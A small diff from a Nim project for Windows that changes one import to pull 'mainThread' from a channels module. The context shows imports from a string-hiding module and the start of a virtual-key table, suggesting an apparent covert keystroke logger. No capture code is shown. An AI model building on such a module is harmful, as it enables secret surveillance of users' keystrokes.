@@ -39,7 +39,7 @@ from winim/utils import winimConverterBOOLToBoolean
 from ../functions/hideString import d
 from ../functions/hideString import e
 
-import ../channels
+from ../channels import mainThread
 
 ## sursa: http://www.kbdedit.com/manual/low_level_vk_list.html
 const keys = {
